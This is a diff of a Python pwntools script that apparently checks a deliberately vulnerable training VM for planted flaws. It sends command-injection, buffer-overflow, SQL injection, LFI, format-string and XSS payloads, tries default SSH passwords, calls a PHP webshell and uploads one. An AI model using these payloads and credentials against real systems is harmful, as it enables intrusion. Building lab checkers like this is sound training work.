@@ -6,21 +6,23 @@ import requests
 
 
 class test_vulns():
+    def __init__(self):
+        pass
+        
     def test_cmd_injection(self, ip):
         """
         Test for command injection on port 2222
         @param ip: ip address of target
         """
+        log.debug("Testing command injection")
         try:
             conn = remote(ip, 2222)
             prompt = conn.recv()
-            log.debug(prompt)
-            conn.send("ls;ls /home/\n")
+            conn.send(b"ls;ls /home/\n")
             results = conn.recv()
         except:
             log.info("Error connecting to " + ip)
             return None
-        log.debug(results)
         conn.close()
         results = results.decode()
         if "elliot" in results:
@@ -36,20 +38,19 @@ class test_vulns():
         Buffer overflow service is running on port 3333
         @param ip: ip address of target
         """
+        log.debug("Testing buffer overflow")
         try:
             conn = remote(ip, 3333)
             prompt = conn.recv()
-            log.debug(prompt)
             overflow_string = "A" * 600 + "\n"
-            conn.send(overflow_string)
+            conn.send(bytes(overflow_string,"UTF-8"))
             results = ""
             results = conn.recv()
         except:
             log.info("Error connecting to " + ip)
             return None
         conn.close()
-        log.debug(results)
-        if "-11" in results:
+        if "-11" in results.decode():
             log.info(ip + " VULNERABLE to buffer overflow")
             return True
         else:
@@ -63,21 +64,20 @@ class test_vulns():
         @oaram pw: password
         """
         try:
+            
             shell = ssh(username, ip, password=pw)
             results = ""
             results = shell["whoami"]
+            results = results.decode()
+            if username in results:
+                log.info(ip + " VULNERABLE to default ssh " + username)
+                return True
+            if shell:
+                shell.close()
         except:
-            log.info("Failed to connect to ssh " + ip)
-            return None
-        log.debug(results)
-        shell.close()
-        results = results.decode()
-        if username in results:
-            log.info(ip + " VULNERABLE to default ssh " + username)
-            return True
-        else:
-            log.info(ip + " NOT VULNERABLE to default ssh " + username)
-            return False
+            log.info("Failed to login or connect to ssh " + ip)
+            pass
+        return False
 
     def test_backdoor_1(self, ip):
         """
@@ -85,26 +85,28 @@ class test_vulns():
         but the backdoor port will decrement after each successful connection
         @param ip: ip address of target
         """
-        for i in range(33123, 33083, -1):
-            port = i
-            try:
-                conn = remote(ip, port)
-                results = ""
-                if conn:
-                    conn.send("ls /home/\n")
-                    results = conn.recv()
-                    conn.close()
-                if "elliot" in results:
-                    log.info(ip + " VULNERABLE to backdoor 1")
-                    return True
-            except:
-                pass
+        log.debug("Testing backdoor 1")
+        try:
+            conn = remote(ip, 33123)
+            results = ""
+            if conn:
+                conn.send(b"ls /home/\n")
+                results = conn.recv()
+                results = results.decode()
+                conn.close()
+            if "elliot" in results:
+                log.info(ip + " VULNERABLE to backdoor 1")
+                return True
+        except:
+            pass
+        return False
 
     def test_backdoor_2(self, ip):
         """
         Test the php backdoor that was left on the machine in the images folder
         @param ip: ip address of target
         """
+        log.debug("Testing backdoor 2")
         url = "http://" + ip + \
             "/arbitrary_file_upload/images/shell.php?cmd=whoami"
         results = ""
@@ -127,6 +129,7 @@ class test_vulns():
         and without using ../
         @param ip: ip address of target
         """
+        log.debug("Testing LFI")
         url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
         results = ""
         try:
@@ -150,6 +153,7 @@ class test_vulns():
         @param username: username to login with over ssh
         @param pw: password to login with over ssh
         """
+        log.debug("Testing local format string 0")
         shell = None
         if keyfile:
             try:
@@ -167,22 +171,26 @@ class test_vulns():
         results = ""
         results = shell[
             "/home/elliot/services/c/formatme_local/printf %x%x%x"]
+        results = results.decode()
         evaluation = re.match(
             "[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
         log.info(results)
-        shell.close()
+        if shell:
+            shell.close()
         if evaluation:
             log.info(ip + " VULNERABLE to local format string")
             return True
         else:
             log.info(ip + " NOT VULNERABLE to local format string")
             return False
+        return False
 
     def test_reflected_xss(self, ip):
         """
         Test for reflected cross-site scripting (XSS)
         @param ip: ip address of target
         """
+        log.debug("Testing reflected XSS")
         url = "http://" + ip + \
             "/xss/xss.php?quote=<img%20src=x%20onerror=alert(1)>"
         results = ""
@@ -191,7 +199,6 @@ class test_vulns():
         except:
             log.info("Failed to connect to reflected XSS " + ip)
             return None
-        log.debug(results)
         results = results.decode()
         if "<img src=x onerror=alert(1)>" in results:
             log.info(ip + " VULNERABLE to reflected xss")
@@ -205,7 +212,7 @@ class test_vulns():
         Test for SQL injection (SQLi)
         @param  ip: ip address of target
         """
-        log.debug("testing sqli on " + ip)
+        log.debug("Testing sqli on " + ip)
         results = ""
         # create SQL injection payload
         payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
@@ -216,24 +223,27 @@ class test_vulns():
         except:
             log.info("Failed to connect to sqli " + ip)
             return None
-        if "Tibet" in results.text:
+        if "Evil Corp" in results.text:
+            log.info(ip + " VULNERABLE to XSS")
             return True
         else:
+            log.info(ip + " NOT VULNERABLE to XSS")
             return False
 
-    def test_local_format_string_chloe(self, ip):
+    def test_local_format_string_elliot(self, ip):
         """
         Test local format string vulnerability as chloe user
         """
-        self.test_local_format_string(
-            ip, "chloe", "chloechloe", keyfile="id_rsa")
+        log.debug("Testing local format string")
+        return self.test_local_format_string(
+            ip, "elliot", "fsociety")
 
     def test_dom_based_xss(self, ip):
         """
         Test for dom based XSS
         @param ip: ip address of target
         """
-        log.info("testing dom based xss")
+        log.debug("Testing dom based xss")
         url = "http://" + ip + "/dom_based_xss/index.html"
         try:
             results = wget(url)
@@ -254,12 +264,13 @@ class test_vulns():
         Test for arbitrary file upload. This function requires the existance of a local file called hacker_shell.php
         @param ip: ip address of target
         """
+        log.debug("Testing arbitrary file upload")
         url = "http://" + ip + "/arbitrary_file_upload/upload.php"
         try:
             hacker_shell = open('hacker_shell.php', 'rb')
         except:
             log.info(
-                "Falied to open local file on server. Make sure hacker_shell.php is in current working directory")
+                "Failed to open local file on server. Make sure hacker_shell.php is in current working directory")
             return None
         files = {'image': hacker_shell}
         try:
@@ -281,37 +292,46 @@ class test_vulns():
             return False
 
     def test_ssh_elliot(self, ip):
+        log.debug("Testing default ssh elliot")
         return self.test_ssh_default(ip, "elliot", "fsociety")
 
     def test_ssh_mrrobot(self, ip):
+        log.debug("Testing default ssh mrrobot")
         return self.test_ssh_default(ip, "mrrobot", "mrrobot")
 
     def test_ssh_trenton(self, ip):
+        log.debug("Testing default ssh trenton")
         return self.test_ssh_default(ip, "trenton", "trenton")
 
-    def test_ssh_trenton(self, ip):
+    def test_ssh_darlene(self, ip):
+        log.debug("Testing default ssh darlene")
         return self.test_ssh_default(ip, "darlene", "darlene")
 
-    def test_ssh_trenton(self, ip):
+    def test_ssh_leslie(self, ip):
+        log.debug("Testing default ssh leslie")
         return self.test_ssh_default(ip, "leslie", "leslie")
-    
-    def test_ssh_trenton(self, ip):
+
+    def test_ssh_mobley(self, ip):
+        log.debug("Testing default ssh mobley")
         return self.test_ssh_default(ip, "mobley", "mobley")
-    
+
 if __name__ == "__main__":
-    ip_addr = "192.168.66.2"
+    ip_addr = "192.168.56.105"
     t = test_vulns()
-    context.log_level = "info"
-    t.test_arbitrary_file_upload(ip_addr)
-    t.test_dom_based_xss(ip_addr)
-    t.test_sqli(ip_addr)
-    t.test_cmd_injection(ip_addr)
-    t.test_buffer_overflow(ip_addr)
-    t.test_ssh_elliot(ip_addr)
-    t.test_ssh_mrrobot(ip_addr)
-    t.test_ssh_trenton(ip_addr)
-    t.test_backdoor_1(ip_addr)
-    t.test_backdoor_2(ip_addr)
-    t.test_lfi(ip_addr)
-    t.test_local_format_string_chloe(ip_addr)
-    t.test_reflected_xss(ip_addr)
+    context.log_level = "critical"
+    print(t.test_arbitrary_file_upload(ip_addr))
+    print(t.test_dom_based_xss(ip_addr))
+    print(t.test_sqli(ip_addr))
+    print(t.test_cmd_injection(ip_addr))
+    print(t.test_buffer_overflow(ip_addr))
+    print(t.test_ssh_elliot(ip_addr))
+    print(t.test_ssh_mrrobot(ip_addr))
+    print(t.test_ssh_trenton(ip_addr))
+    print(t.test_ssh_darlene(ip_addr))
+    print(t.test_ssh_leslie(ip_addr))
+    print(t.test_ssh_mobley(ip_addr))
+    print(t.test_backdoor_1(ip_addr))
+    print(t.test_backdoor_2(ip_addr))
+    print(t.test_lfi(ip_addr))
+    print(t.test_local_format_string_elliot(ip_addr))
+    print(t.test_reflected_xss(ip_addr))
